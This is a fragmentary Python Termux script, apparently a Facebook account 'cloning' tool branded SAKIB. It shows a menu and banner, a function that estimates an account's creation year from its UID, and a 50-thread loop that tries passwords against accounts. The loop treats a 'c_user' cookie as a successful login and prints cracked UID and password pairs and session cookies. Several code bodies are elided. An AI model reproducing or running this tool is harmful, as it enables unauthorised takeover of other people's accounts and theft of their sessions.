...
def o():
    ...
    print(" \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××")
    SAKIB = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m Choice Option \033[38;5;196m: ')
    if SAKIB == 'A':
        SAKIB()
    if SAKIB == 'B':
        ...
        return None
    if SAKIB == 'C':
        os.system('xdg-open https://facebook.com/groups/1177120342659268/')
        return None
    if SAKIB == 'D':
...
▄█ █▀█ █░█ █ █▄█
 ...
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;195mASRAFUL ISLAM SAKIB   \033[38;5;46m|
 ...
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mGITHUB       \033[38;5;196m:  \033[38;5;195mKgSAKIB               \033[38;5;46m|
 ...
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m SAKIB TERMUX HELPING ZONE....
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××""")
def linex():
	print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :SAKIB = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :SAKIB = ' ~> 2009'
        elif uid[:8] in ['10000000']        :SAKIB = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:SAKIB = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:SAKIB = ' 2010'
        elif uid[:6] in ['100001']          :SAKIB = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :SAKIB = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :SAKIB = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :SAKIB = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :SAKIB = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :SAKIB = ' ~> 2015'
        elif uid[:5] in ['10001']           :SAKIB = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :SAKIB = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :SAKIB = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :SAKIB = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :SAKIB = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:SAKIB = ' ~> 2021'
        elif uid[:5] in ['10008']           :SAKIB = ' ~>2022'
        elif uid[:5] in ['10009']           :SAKIB = ' ~> 2023'
        else:SAKIB=''
...
def SAKIB():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m TOOL OWNER \033[1;97m: \033[38;5;45m SAKIB')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('    \033[38;5;45m[SAKIB-OK💉] '+uid+' | '+ps+'\033[38;5;46m'+asha(uid)+'\n    \033[38;5;196m[Usar Agent🤖]\033[38;5;195m'+pro+' \033[1;91m ')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\r\r\33[1;31m [SAKIB-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r \33[1;93m[%sSAKIB\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
